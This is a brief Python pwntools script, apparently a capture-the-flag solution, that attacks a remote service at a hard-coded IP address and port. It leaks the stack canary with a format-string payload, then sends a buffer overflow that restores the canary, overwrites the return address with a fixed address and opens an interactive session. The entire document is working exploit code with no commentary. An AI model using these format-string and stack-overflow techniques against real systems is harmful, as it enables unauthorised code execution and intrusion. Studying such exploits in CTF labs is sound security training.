from pwn import *

io = remote('111.200.241.244', 53116)
# io = process('./pwn')
io.recv()
io.send(b'2\0')
payload1 = b'%31$p\n'
io.recv()
io.send(payload1)
canary = io.recv()[2:18].decode()
payload2 = cyclic(0x88) + p64(int(canary, 16)) + b'A' * 8 + p64(0x4008da)
io.send(b'1\n')
io.recv()
io.send(payload2)
io.interactive()